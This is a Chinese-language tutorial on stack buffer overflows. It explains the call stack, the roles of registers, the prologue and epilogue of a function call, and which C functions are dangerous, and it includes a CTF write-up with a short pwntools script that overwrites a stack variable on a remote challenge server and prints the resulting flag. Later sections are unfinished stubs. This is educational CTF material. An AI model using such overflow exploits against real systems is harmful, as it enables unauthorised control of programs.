# 栈溢出从入门到入狱



* #### 函数调用栈

  * #####  栈与系统栈

    * 栈

      栈是一种特殊的线性表，仅能在线性表的一端操作，栈顶允许操作，栈底不允许操作，先进后出。栈顶放入元素的操作称为入栈，取出元素称为出栈。 

    * 系统栈

      内存中的栈，由系统自动维护，用于实现高级语言中的函数调用。 

      程序的栈是从进程地址空间的高地址向低地址增长的，高地址是栈底，低地址是栈顶

  * ##### 寄存器与栈帧

    * ESP：栈指针寄存器，其内存中是一个指针，该指针永远指系统栈最上面的一个栈帧的栈顶。 
    * EBP：基址指针寄存器，其内存中是一个指针，该指针永远指向系统栈最上面的要给栈帧的底部。 
    * EIP：指令寄存器，其内存中是一个指针，该指针永远指向下一条等待执行的指令地址。 

  * ##### 函数调用过程

    1. 参数入栈：将参数从右向左依次压入系统栈

    2. 返回地址入栈：将当前代码区调用的下一条指令地址压入栈中，供函数返回时继续执行。 

    3. 代码区跳转：处理器从当前代码区跳到被执行函数入口。 

    4. 栈帧调整：

       1. 保存当前栈帧状态，以备后面恢复本栈帧使用（push %ebp）
       2. 将当前栈帧切换到新的栈帧（mov %esp, %ebp）
       3. 给新栈帧分配空间（%esp减去所需空间大小，抬高栈顶） 

    5. 参数值放入内存

    6. 保存返回值（通常保存在%eax中）

    7. 降低栈顶，回收当前栈帧的空间（mov %ebp, %esp）

    8. 之前保存的ebp弹入%ebp（pop %ebp），恢复上一个栈帧

    9. 返回地址弹入%eip（ret）

       ![1](C:\Users\wdbbw\Desktop\1.jpg)

       

  * ##### 栈溢出原理

    程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变 

    * ###### 前提

      1. 程序必须向栈上写入数据。
      2. 写入的数据大小没有被良好地控制。

    * ###### 基本操作

      通过覆盖地址的方法来直接或者间接地控制程序执行流程。

      1. 寻找危险函数

         * 输入
           * gets，直接读取一行，忽略'\x00'
           * scanf
           * vscanf（将格式化数据读入可变参数列表）
         * 输出 
           * sprintf（把格式化的数据写入某个字符串中）
         * 字符串 
           * strcpy，字符串复制，遇到'\x00'停止
           * strcat，字符串拼接，遇到'\x00'停止
           * bcopy

      2. 确定填充长度 

         计算要操作的地址与要覆盖的地址的距离

    * ###### 覆盖栈上某个变量的内容

      **CGCTF-When did you born？**

      ![3](C:\Users\wdbbw\Desktop\3.png)

      没有开启PIE

      ![2](C:\Users\wdbbw\Desktop\2.png)

      v5 = 1926可以得到flag，但输入v5后有一个判断，不能直接输入1926

      v5 != 1926，进入else，在输入v4时可以利用缓冲区溢出把v5的值修改为1926

      可以看出v5和v4的距离是8个字节，gets(&v4)时输入8字节的数据和1926就可以把v5修改为1926

      ```python
      from pwn import *
      r = remote("ctf.acdxvfsvd.net",1926)
      payload='a'*8 + p32(1926)
      r.recvuntil("What\'s Your Birth?\n")
      r.sendline("1234")
      r.recvuntil("What\'s Your Name?\n")
      r.sendline(payload)
      r.interactive()
      
      #flag{gets_is_dangerous_+1s}
      ```

      

    * ##### 覆盖函数返回地址调用函数

      [**CSAPP-Buffer Lab**](https://aidaip.github.io/example/2019-02-07-CSAPP-Buffer-Lab/)

      

    * ##### 

      

      **CGCTF-Stack Overflow**

      ![6](C:\Users\wdbbw\Desktop\6.png)

      ![4](C:\Users\wdbbw\Desktop\4.png)

      ![5](C:\Users\wdbbw\Desktop\5.png)

      

    * 